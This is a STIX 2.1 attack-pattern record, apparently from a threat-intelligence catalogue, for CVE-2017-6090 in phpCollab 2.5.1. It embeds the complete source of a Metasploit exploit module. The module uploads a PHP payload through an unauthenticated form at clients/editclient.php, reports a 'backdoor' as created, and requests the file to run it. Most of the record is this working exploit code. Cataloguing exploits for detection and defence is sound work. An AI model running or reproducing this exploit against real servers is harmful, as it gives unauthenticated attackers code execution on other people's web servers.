{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--feb1b4b2-9216-44c6-be19-1e1748827595",
    "created": "2024-08-14T17:13:37.397254Z",
    "modified": "2024-08-14T17:13:37.397258Z",
    "name": "phpCollab 2.5.1 Unauthenticated File Upload",
    "description": " This module exploits a file upload vulnerability in phpCollab 2.5.1 which could be abused to allow unauthenticated users to execute arbitrary code under the context of the web server user.  The exploit has been tested on Ubuntu 16.04.3 64-bit ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/phpcollab_upload_exec.rb",
            "external_id": "phpcollab_upload_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-6090"
        },
        {
            "source_name": "reference",
            "url": "http://www.phpcollab.com/"
        },
        {
            "source_name": "reference",
            "url": "https://sysdream.com/news/lab/2017-09-29-cve-2017-6090-phpcollab-2-5-1-arbitrary-file-upload-unauthenticated/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'phpCollab 2.5.1 Unauthenticated File Upload',\n      'Description'    => %q{\n          This module exploits a file upload vulnerability in phpCollab 2.5.1\n        which could be abused to allow unauthenticated users to execute arbitrary code\n        under the context of the web server user.\n\n        The exploit has been tested on Ubuntu 16.04.3 64-bit\n      },\n      'Author'         =>\n        [\n          'Nicolas SERRA <n.serra[at]sysdream.com>', # Vulnerability discovery\n          'Nick Marcoccio \"1oopho1e\" <iremembermodems[at]gmail.com>', # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2017-6090' ],\n          [ 'EDB', '42934' ],\n          [ 'URL', 'http://www.phpcollab.com/' ],\n          [ 'URL', 'https://sysdream.com/news/lab/2017-09-29-cve-2017-6090-phpcollab-2-5-1-arbitrary-file-upload-unauthenticated/' ]\n        ],\n      'Privileged'     => false,\n      'Platform'       => ['php'],\n      'Arch'           => ARCH_PHP,\n      'Targets'        => [ ['Automatic', {}] ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2017-09-29'\n      ))\n\n      register_options(\n        [\n          OptString.new('TARGETURI', [ true, \"Installed path of phpCollab \", \"/phpcollab/\"])\n        ])\n  end\n\n  def check\n    url = normalize_uri(target_uri.path, \"general/login.php?msg=logout\")\n    res = send_request_cgi(\n        'method'  => 'GET',\n        'uri'     =>  url\n    )\n\n    version = res.body.scan(/PhpCollab v([\\d\\.]+)/).flatten.first\n    vprint_status(\"Found version: #{version}\")\n\n    unless version\n      vprint_status('Unable to get the PhpCollab version.')\n      return CheckCode::Unknown\n    end\n\n    if Rex::Version.new(version) >= Rex::Version.new('0')\n      return CheckCode::Appears\n    end\n\n    CheckCode::Safe\n  end\n\n  def exploit\n    filename = '1.' + rand_text_alpha(8 + rand(4)) + '.php'\n    id = File.basename(filename,File.extname(filename))\n    register_file_for_cleanup(filename)\n\n    data = Rex::MIME::Message.new\n    data.add_part(payload.encoded, 'application/octet-stream', nil, \"form-data; name=\\\"upload\\\"; filename=\\\"#{filename}\\\"\")\n\n    print_status(\"Uploading backdoor file: #{filename}\")\n\n    res = send_request_cgi({\n      'method'   => 'POST',\n      'uri'      => normalize_uri(target_uri.path, 'clients/editclient.php'),\n      'vars_get' => {\n        'id'     => id,\n        'action' => 'update'\n      },\n      'ctype'    => \"multipart/form-data; boundary=#{data.bound}\",\n      'data'     => data.to_s\n     })\n\n    if res && res.code == 302\n      print_good(\"Backdoor successfully created.\")\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Error on uploading file\")\n    end\n\n    print_status(\"Triggering the exploit...\")\n    send_request_cgi({\n      'method'  => 'GET',\n      'uri'     => normalize_uri(target_uri.path, \"logos_clients/\" + filename)\n     }, 5)\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-09-29",
    "x_mitre_platforms": [
        "['php']"
    ]
}